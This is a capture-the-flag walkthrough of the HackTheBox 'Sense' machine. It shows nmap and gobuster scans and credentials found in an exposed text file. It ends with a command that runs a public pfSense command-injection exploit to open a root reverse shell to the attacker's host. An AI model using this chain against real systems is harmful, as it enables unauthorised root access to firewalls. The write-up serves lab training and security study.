---
title: Sense - HackTheBox Walkthrough
date: 2021-11-06 12:00:00 
categories: [HackTheBox,Linux]
tags: [exploit]
img_path: /assets/img/HTB/Sense/
image: 
  path: 00-banner.png
---
Hello guys, welcome back with another walkthrough, this time we'll be doing `Sense` a retired linuxs machine from HackTheBox rated easy. Without further ado, let’s begin.
# Recon
## Nmap Scan
As always we'll start with a nmap scan to discover the open ports and services.

```console
$ cat nmap-scan
# Nmap 7.91 scan initiated Mon Nov  1 10:57:12 2021 as: nmap -sC -sV -v -oN nmap-scan 10.129.230.105
Nmap scan report for 10.129.230.105
Host is up (0.12s latency).
Not shown: 998 filtered ports
PORT    STATE SERVICE  VERSION
80/tcp  open  http     lighttpd 1.4.35
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: lighttpd/1.4.35
|_http-title: Did not follow redirect to https://10.129.230.105/
443/tcp open  ssl/http lighttpd 1.4.35
|_http-favicon: Unknown favicon MD5: 082559A7867CF27ACAB7E9867A8B320F
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: lighttpd/1.4.35
|_http-title: Login
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Issuer: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-10-14T19:21:35
| Not valid after:  2023-04-06T19:21:35
| MD5:   65f8 b00f 57d2 3468 2c52 0f44 8110 c622
|_SHA-1: 4f7c 9a75 cb7f 70d3 8087 08cb 8c27 20dc 05f1 bb02
|_ssl-date: TLS randomness does not represent time

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov  1 10:57:45 2021 -- 1 IP address (1 host up) scanned in 32.82 seconds
```
There only two ports: `80:http` and `443:https`.

## HTTP/HTTPS Enumeration
The 80 port redirect us to 443 which is a pfsense's login form.

![01-web](01-web.png)

The [default credentials](https://docs.netgate.com/pfsense/en/latest/usermanager/defaults.html): `admin/pfsense` doesn't work, so let's try discover new directories using gobuster.

```console
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.129.230.105 -k -t 100 -x php,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.129.230.105
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
2021/11/01 09:32:05 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 6690]
/help.php             (Status: 200) [Size: 6689]
/themes               (Status: 301) [Size: 0] [--> https://10.129.230.105/themes/]
/stats.php            (Status: 200) [Size: 6690]
/css                  (Status: 301) [Size: 0] [--> https://10.129.230.105/css/]
/includes             (Status: 301) [Size: 0] [--> https://10.129.230.105/includes/]
/license.php          (Status: 200) [Size: 6692]
/edit.php             (Status: 200) [Size: 6689]
/system.php           (Status: 200) [Size: 6691]
/status.php           (Status: 200) [Size: 6691]
/javascript           (Status: 301) [Size: 0] [--> https://10.129.230.105/javascript/]
/changelog.txt        (Status: 200) [Size: 271]
/classes              (Status: 301) [Size: 0] [--> https://10.129.230.105/classes/]
/exec.php             (Status: 200) [Size: 6689]
/widgets              (Status: 301) [Size: 0] [--> https://10.129.230.105/widgets/]
/graph.php            (Status: 200) [Size: 6690]
/tree                 (Status: 301) [Size: 0] [--> https://10.129.230.105/tree/]
/wizard.php           (Status: 200) [Size: 6691]
/shortcuts            (Status: 301) [Size: 0] [--> https://10.129.230.105/shortcuts/]
/pkg.php              (Status: 200) [Size: 6688]
/installer            (Status: 301) [Size: 0] [--> https://10.129.230.105/installer/]
/wizards              (Status: 301) [Size: 0] [--> https://10.129.230.105/wizards/]
/xmlrpc.php           (Status: 200) [Size: 384]
/reboot.php           (Status: 200) [Size: 6691]
/interfaces.php       (Status: 200) [Size: 6695]
/csrf                 (Status: 301) [Size: 0] [--> https://10.129.230.105/csrf/]
/system-users.txt     (Status: 200) [Size: 106]
/filebrowser          (Status: 301) [Size: 0] [--> https://10.129.230.105/filebrowser/]
/%7Echeckout%7E       (Status: 403) [Size: 345]

===============================================================
2021/11/01 09:48:43 Finished
===============================================================
```
The most interesting files are `changelog.txt` and `system-user.txt`.

![02-txt](02-txt.png)

With the second file we get Rohit's credentials.

![03-txt](03-txt.png)

User|Password
-|-
rohit | pfsense

# Explotation

Pfsense in vulnerable to a [Command Injection](https://www.exploit-db.com/exploits/43560) so we can use it to get a reverse shell.

![04-vuln](04-vuln.png)

How pfSense is running as root the shell that we got is with root privileges.

```console
$ python3 43560.py --rhost 10.129.230.105 --lhost 10.10.14.89 --lport 443 --username rohit --password pfsense
```
![05-root](05-root.png)

That’s it for now guys. Until next time.
